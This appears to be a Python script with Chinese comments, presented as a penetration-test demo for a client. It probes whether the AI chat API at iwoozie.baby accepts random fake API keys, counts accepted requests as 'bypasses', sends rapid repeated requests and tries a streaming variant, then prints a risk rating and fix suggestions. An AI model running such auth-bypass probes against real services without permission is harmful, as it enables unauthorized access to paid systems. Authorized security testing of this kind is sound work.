#!/usr/bin/env python3
"""
iwoozie.baby AI聊天系统 - 简化客户演示版本
=========================================
专为甲方客户设计的简化版安全测试演示系统
适合快速演示和客户体验
"""

import requests
import time
import random
import string
import json
from datetime import datetime

class SimpleClientDemo:
    def __init__(self):
        self.base_url = "https://iwoozie.baby"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Connection': 'keep-alive'
        })
        
        self.results = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'bypassed_models': set(),
            'details': []
        }
    
    def print_header(self):
        print("=" * 70)
        print("🔓 iwoozie.baby AI聊天系统 - 客户安全演示")
        print("=" * 70)
        print("🎯 目标: 测试系统安全防护能力")
        print("⏰ 时间:", datetime.now().strftime('%Y-%m-%d %H:%M:%S'))
        print("=" * 70)
        print()
    
    def generate_token(self):
        """生成测试token"""
        return f"test_token_{random.randint(1000, 9999)}"
    
    def test_model(self, model, show_details=True):
        """测试单个模型"""
        if show_details:
            print(f"🎯 测试模型: {model}")
            print(f"🔑 使用Token: {self.generate_token()}")
        
        token = self.generate_token()
        url = f"{self.base_url}/api/quick/createAITask?model={model}"
        
        headers = {
            'Content-Type': 'application/json',
            'x-api-key': token
        }
        
        data = {
            "Content": [{
                "role": "user", 
                "content": f"Security test for {model} - please respond with 'Test successful'"
            }]
        }
        
        try:
            start_time = time.time()
            response = self.session.post(url, json=data, headers=headers, timeout=10)
            response_time = time.time() - start_time
            
            self.results['total'] += 1
            
            if response.status_code == 200:
                try:
                    result = response.json()
                    if result.get('code') == 200:
                        self.results['success'] += 1
                        self.results['bypassed_models'].add(model)
                        if show_details:
                            print(f"  ✅ 绕过成功! 响应时间: {response_time:.2f}s")
                            print(f"  📄 AI响应: {result.get('data', {}).get('message', 'No message')[:50]}...")
                        return True
                    else:
                        self.results['failed'] += 1
                        if show_details:
                            print(f"  ❌ 绕过失败: {result.get('error', 'Unknown error')}")
                        return False
                except:
                    self.results['failed'] += 1
                    if show_details:
                        print(f"  ❌ 响应解析失败")
                    return False
            else:
                self.results['failed'] += 1
                if show_details:
                    print(f"  ❌ HTTP错误: {response.status_code}")
                return False
                
        except Exception as e:
            self.results['failed'] += 1
            if show_details:
                print(f"  💥 异常: {str(e)}")
            return False
    
    def run_quick_demo(self):
        """运行快速演示"""
        self.print_header()
        
        print("🚀 开始快速安全测试...")
        print()
        
        # 测试主要模型
        models = ['GPT-4', 'Gemini-2.5-Pro', 'Grok-4-Fast', 'Claude-Sonnet-4']
        
        for model in models:
            print(f"📋 测试 {model}")
            print("-" * 40)
            self.test_model(model, show_details=True)
            print()
            time.sleep(1)  # 避免过于频繁
        
        # 生成报告
        self.generate_report()
    
    def run_detailed_demo(self):
        """运行详细演示"""
        self.print_header()
        
        print("🔍 开始详细安全测试...")
        print()
        
        # 测试所有模型
        models = [
            'GPT-4', 'GPT-4o', 'GPT-4o-Mini',
            'Claude-Sonnet-4', 'Claude-Opus-4',
            'Gemini-2.5-Pro', 'Gemini-2.5-Flash',
            'Grok-4-Fast', 'Grok-4-Stable',
            'DeepSeek-V3.1', 'GLM-4.5'
        ]
        
        print(f"📊 将测试 {len(models)} 个AI模型")
        print()
        
        for i, model in enumerate(models, 1):
            print(f"📋 测试 {i}/{len(models)}: {model}")
            print("-" * 50)
            self.test_model(model, show_details=True)
            print()
            time.sleep(0.5)
        
        # 生成详细报告
        self.generate_detailed_report()
    
    def test_rate_limits(self):
        """测试频率限制"""
        print("\n⏰ 测试频率限制...")
        print("-" * 40)
        
        model = 'GPT-4'
        print(f"🎯 目标模型: {model}")
        print("🚀 发送快速连续请求...")
        
        for i in range(5):
            print(f"  请求 {i+1}/5...", end=" ")
            success = self.test_model(model, show_details=False)
            if success:
                print("✅")
            else:
                print("❌")
            time.sleep(0.1)
        
        print()
    
    def test_stream_bypass(self):
        """测试流式响应绕过"""
        print("\n🌊 测试流式响应绕过...")
        print("-" * 40)
        
        model = 'GPT-4'
        token = self.generate_token()
        url = f"{self.base_url}/api/quick/createAITask?model={model}&stream=true"
        
        headers = {
            'Content-Type': 'application/json',
            'x-api-key': token
        }
        
        data = {
            "Content": [{
                "role": "user", 
                "content": "Generate a short response about cybersecurity"
            }]
        }
        
        try:
            print(f"🎯 目标模型: {model}")
            print(f"🔑 使用Token: {token}")
            print("🚀 发送流式请求...")
            
            response = self.session.post(url, json=data, headers=headers, timeout=15, stream=True)
            
            if response.status_code == 200:
                print("✅ 流式请求成功!")
                print("📄 接收数据流:")
                print("-" * 30)
                
                chunk_count = 0
                for chunk in response.iter_lines():
                    if chunk:
                        chunk_count += 1
                        chunk_text = chunk.decode('utf-8')
                        print(f"  {chunk_count:2d}: {chunk_text[:60]}...")
                        
                        if chunk_count >= 5:
                            print("  ... (更多数据)")
                            break
                
                print("-" * 30)
                print(f"📊 接收了 {chunk_count} 个数据块")
                self.results['success'] += 1
            else:
                print(f"❌ 流式请求失败: HTTP {response.status_code}")
                self.results['failed'] += 1
                
        except Exception as e:
            print(f"💥 流式请求异常: {str(e)}")
            self.results['failed'] += 1
        
        self.results['total'] += 1
        print()
    
    def generate_report(self):
        """生成基本报告"""
        print("=" * 70)
        print("📊 安全测试结果报告")
        print("=" * 70)
        
        total = self.results['total']
        success = self.results['success']
        failed = self.results['failed']
        success_rate = (success / total * 100) if total > 0 else 0
        
        print(f"📈 测试统计:")
        print(f"  总测试次数: {total}")
        print(f"  成功绕过: {success}")
        print(f"  失败次数: {failed}")
        print(f"  绕过成功率: {success_rate:.1f}%")
        print()
        
        if self.results['bypassed_models']:
            print(f"✅ 成功绕过的模型 ({len(self.results['bypassed_models'])} 个):")
            for model in sorted(self.results['bypassed_models']):
                print(f"  - {model}")
        else:
            print("❌ 没有成功绕过任何模型")
        print()
        
        # 安全评级
        if success_rate > 50:
            print("🚨 安全评级: 严重风险")
            print("   系统存在严重安全漏洞，建议立即修复!")
        elif success_rate > 20:
            print("⚠️  安全评级: 中等风险")
            print("   系统存在安全风险，建议尽快改进")
        else:
            print("✅ 安全评级: 良好")
            print("   系统安全状况良好，但仍有改进空间")
        
        print("\n" + "=" * 70)
    
    def generate_detailed_report(self):
        """生成详细报告"""
        self.generate_report()
        
        print("💡 安全建议:")
        print("1. 加强API密钥验证机制")
        print("2. 实施更严格的访问控制")
        print("3. 添加异常访问监控")
        print("4. 定期进行安全审计")
        print()
        
        print("📞 如需技术支持，请联系乙方安全团队")
        print("=" * 70)

def main():
    """主函数"""
    demo = SimpleClientDemo()
    
    print("选择演示模式:")
    print("1. 快速演示 (推荐)")
    print("2. 详细演示")
    print("3. 完整演示 (包含频率限制和流式测试)")
    
    try:
        choice = input("\n请选择 (1-3): ").strip()
        
        if choice == '1':
            demo.run_quick_demo()
        elif choice == '2':
            demo.run_detailed_demo()
        elif choice == '3':
            demo.run_quick_demo()
            demo.test_rate_limits()
            demo.test_stream_bypass()
            demo.generate_detailed_report()
        else:
            print("❌ 无效选择，运行快速演示")
            demo.run_quick_demo()
            
    except KeyboardInterrupt:
        print("\n\n⏹️  演示被用户中断")
    except Exception as e:
        print(f"\n💥 演示过程中发生错误: {str(e)}")

if __name__ == "__main__":
    main()
